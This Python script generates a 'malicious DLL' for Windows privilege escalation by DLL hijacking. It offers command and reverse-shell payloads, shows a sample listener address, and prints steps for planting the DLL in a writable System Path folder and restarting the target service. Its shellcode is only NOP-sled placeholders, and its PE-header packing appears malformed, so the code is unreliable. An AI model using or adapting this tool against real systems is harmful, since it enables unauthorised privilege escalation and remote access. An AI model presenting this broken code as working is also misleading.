#!/usr/bin/env python3
"""
Generate a malicious DLL for Windows privilege escalation via DLL hijacking.
This creates a simple DLL that executes a payload when loaded.

Usage:
    python generate-malicious-dll.py --output WptsExtensions.dll --payload "reverse_shell"
    python generate-malicious-dll.py --output WptsExtensions.dll --command "whoami > C:\\temp\\output.txt"
"""

import argparse
import os
import sys
import struct
import hashlib
from pathlib import Path

# PE Header constants
DOS_HEADER_SIZE = 64
NT_HEADERS_SIGNATURE = b'PE\x00\x00'

# Section characteristics
SEC_CHARACTERISTICS = 0x60000020  # CODE | EXECUTE | READ | WRITE

def create_dos_header():
    """Create DOS MZ header"""
    dos_header = bytearray(DOS_HEADER_SIZE)
    dos_header[0:2] = b'MZ'  # DOS signature
    dos_header[58:60] = struct.pack('<I', 64 + 24)  # e_lfanew - offset to PE header
    return bytes(dos_header)

def create_nt_headers(section_rva, section_size):
    """Create NT Headers"""
    # PE Signature
    pe_sig = NT_HEADERS_SIGNATURE
    
    # COFF File Header (20 bytes)
    machine = 0x8664  # AMD64
    num_sections = 1
    time_date_stamp = 0
    pointer_symbol_table = 0
    num_symbols = 0
    size_optional_header = 240  # Standard for PE32+
    characteristics = 0x22  # EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
    
    coff_header = struct.pack('<HHIIIHH',
        machine, num_sections, time_date_stamp,
        pointer_symbol_table, num_symbols, size_optional_header, characteristics
    )
    
    # Optional Header (PE32+ format)
    magic = 0x20b  # PE32+
    major_linker_version = 14
    minor_linker_version = 0
    size_code = section_size
    size_initialized_data = 0
    size_uninitialized_data = 0
    address_entry_point = section_rva + 0x1000  # DllMain offset
    base_of_code = section_rva
    image_base = 0x140000000  # 64-bit image base
    section_alignment = 0x1000
    file_alignment = 0x200
    major_os_version = 6
    minor_os_version = 0
    major_image_version = 0
    minor_image_version = 0
    major_subsystem_version = 6
    minor_subsystem_version = 0
    win32_version_value = 0
    size_image = 0x10000
    size_headers = 0x200
    check_sum = 0
    subsystem = 2  # WINDOWS_GUI
    dll_characteristics = 0x8130  # DYNAMIC_BASE | NX_COMPAT | TERMINAL_SERVER_AWARE | NO_SEH
    size_stack_reserve = 0x100000
    size_stack_commit = 0x1000
    size_heap_reserve = 0x100000
    size_heap_commit = 0x1000
    loader_flags = 0
    num_rva_and_sizes = 16
    
    optional_header = struct.pack('<HBBBBBBBB',
        magic, major_linker_version, minor_linker_version,
        size_code, size_initialized_data, size_uninitialized_data,
        address_entry_point, base_of_code
    )
    optional_header += struct.pack('<QIIIIIIIIIIIIIIII',
        image_base, section_alignment, file_alignment,
        major_os_version, minor_os_version, major_image_version, minor_image_version,
        major_subsystem_version, minor_subsystem_version, win32_version_value,
        size_image, size_headers, check_sum, subsystem,
        dll_characteristics, size_stack_reserve, size_stack_commit,
        size_heap_reserve, size_heap_commit, loader_flags, num_rva_and_sizes
    )
    
    # Data Directory entries (16 entries, 8 bytes each)
    data_directories = b'\x00' * (16 * 8)
    
    # Section Table
    section_name = b'.text\x00\x00\x00\x00\x00'
    virtual_size = section_size
    virtual_address = section_rva
    raw_size = ((section_size + 0x1FF) & ~0x1FF)  # File alignment
    raw_pointer = 0x200  # After headers
    relocation_pointer = 0
    line_number_pointer = 0
    num_relocations = 0
    num_line_numbers = 0
    
    section_table = section_name + struct.pack('<IIIIIIHHI',
        virtual_size, virtual_address, raw_size, raw_pointer,
        relocation_pointer, line_number_pointer, num_relocations, num_line_numbers, SEC_CHARACTERISTICS
    )
    
    return pe_sig + coff_header + optional_header + data_directories + section_table

def create_dll_main(payload_type, command=None, lhost=None, lport=None):
    """Create DllMain function with payload"""
    
    # Shellcode for different payloads
    if payload_type == "whoami":
        # Simple whoami command
        shellcode = create_command_shellcode("whoami > C:\\temp\\privesc.txt")
    elif payload_type == "reverse_shell":
        if not lhost or not lport:
            raise ValueError("reverse_shell requires --lhost and --lport")
        shellcode = create_reverse_shell_shellcode(lhost, lport)
    elif payload_type == "command" and command:
        shellcode = create_command_shellcode(command)
    else:
        # Default: whoami
        shellcode = create_command_shellcode("whoami")
    
    # DllMain prologue and setup
    dll_main = bytearray()
    
    # Prologue
    dll_main.extend(b'\x53')  # push rbx
    dll_main.extend(b'\x55')  # push rbp
    dll_main.extend(b'\x56')  # push rsi
    dll_main.extend(b'\x57')  # push rdi
    dll_main.extend(b'\x41\x50')  # push r8
    dll_main.extend(b'\x41\x51')  # push r9
    
    # Check if DLL_PROCESS_ATTACH (reason == 1)
    dll_main.extend(b'\x48\x83\x7c\x24\x28\x01')  # cmp QWORD PTR [rsp+28h], 1
    dll_main.extend(b'\x75\x20')  # jne skip_payload (skip if not attach)
    
    # Payload execution via CreateProcess
    # This is a simplified version - in practice you'd want proper shellcode
    dll_main.extend(shellcode)
    
    # Skip label
    dll_main.extend(b'\x90' * 10)  # skip_payload: nop padding
    
    # Return TRUE
    dll_main.extend(b'\xb8\x01\x00\x00\x00')  # mov eax, 1
    
    # Epilogue
    dll_main.extend(b'\x41\x59')  # pop r9
    dll_main.extend(b'\x41\x58')  # pop r8
    dll_main.extend(b'\x5f')  # pop rdi
    dll_main.extend(b'\x5e')  # pop rsi
    dll_main.extend(b'\x5d')  # pop rbp
    dll_main.extend(b'\x5b')  # pop rbx
    dll_main.extend(b'\xc3')  # ret
    
    return bytes(dll_main)

def create_command_shellcode(command):
    """Create shellcode to execute a command via CreateProcessW"""
    # This is a placeholder - real implementation would need proper shellcode
    # For now, we'll create a simple stub
    return b'\x90' * 64  # NOP sled

def create_reverse_shell_shellcode(lhost, lport):
    """Create reverse shell shellcode"""
    # Placeholder - would need proper reverse shell shellcode
    return b'\x90' * 128  # NOP sled

def create_dll(output_path, payload_type="whoami", command=None, lhost=None, lport=None):
    """Create a complete malicious DLL"""
    
    print(f"[*] Creating malicious DLL: {output_path}")
    print(f"[*] Payload type: {payload_type}")
    
    # Create DllMain
    dll_main = create_dll_main(payload_type, command, lhost, lport)
    
    # Pad to section alignment
    section_size = ((len(dll_main) + 0x1FF) & ~0x1FF)
    dll_main = dll_main + b'\x00' * (section_size - len(dll_main))
    
    # Create PE headers
    dos_header = create_dos_header()
    nt_headers = create_nt_headers(0x200, section_size)
    
    # Combine all parts
    pe_data = dos_header + nt_headers + dll_main
    
    # Write to file
    with open(output_path, 'wb') as f:
        f.write(pe_data)
    
    # Calculate hash
    file_hash = hashlib.sha256(pe_data).hexdigest()
    
    print(f"[+] DLL created: {output_path}")
    print(f"[+] Size: {len(pe_data)} bytes")
    print(f"[+] SHA256: {file_hash}")
    print(f"")
    print(f"[*] Next steps:")
    print(f"    1. Copy {output_path} to your writable System Path folder")
    print(f"    2. Rename to match the missing DLL name (e.g., WptsExtensions.dll)")
    print(f"    3. Restart the target service or reboot")
    print(f"    4. Verify with Procmon that the DLL was loaded")
    print(f"")
    
    return output_path

def main():
    parser = argparse.ArgumentParser(
        description='Generate a malicious DLL for Windows privilege escalation via DLL hijacking',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    python generate-malicious-dll.py --output WptsExtensions.dll --payload whoami
    python generate-malicious-dll.py --output WptsExtensions.dll --payload command --command "whoami > C:\\temp\\output.txt"
    python generate-malicious-dll.py --output WptsExtensions.dll --payload reverse_shell --lhost 192.168.1.100 --lport 4444
        """
    )
    
    parser.add_argument('--output', '-o', required=True, help='Output DLL file path')
    parser.add_argument('--payload', '-p', default='whoami', 
                        choices=['whoami', 'command', 'reverse_shell'],
                        help='Payload type (default: whoami)')
    parser.add_argument('--command', '-c', help='Command to execute (for --payload command)')
    parser.add_argument('--lhost', help='Listener IP for reverse shell')
    parser.add_argument('--lport', type=int, help='Listener port for reverse shell')
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.payload == 'reverse_shell':
        if not args.lhost or not args.lport:
            print("[-] Error: reverse_shell requires --lhost and --lport")
            sys.exit(1)
    
    if args.payload == 'command' and not args.command:
        print("[-] Error: command payload requires --command")
        sys.exit(1)
    
    # Create output directory if needed
    output_dir = os.path.dirname(args.output)
    if output_dir and not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    # Generate DLL
    create_dll(args.output, args.payload, args.command, args.lhost, args.lport)

if __name__ == '__main__':
    main()
